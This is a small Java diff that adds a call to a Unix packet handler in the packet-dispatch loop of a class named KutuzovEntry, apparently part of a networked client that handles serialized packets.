@@ -90,6 +90,7 @@ public class KutuzovEntry {
                       else if(OSDetector.isWindows())
                         KutuzovWinPackets.handlePacket(ois, oos, (Packet)packet);
                     KutuzovKFTPPackets.handlePacket(ois, oos, (Packet)packet);
+                    KutuzovUnixPackets.handlePacket(ois, oos, (Packet)packet);
                 } catch (Exception ignored) {}
             }
         });
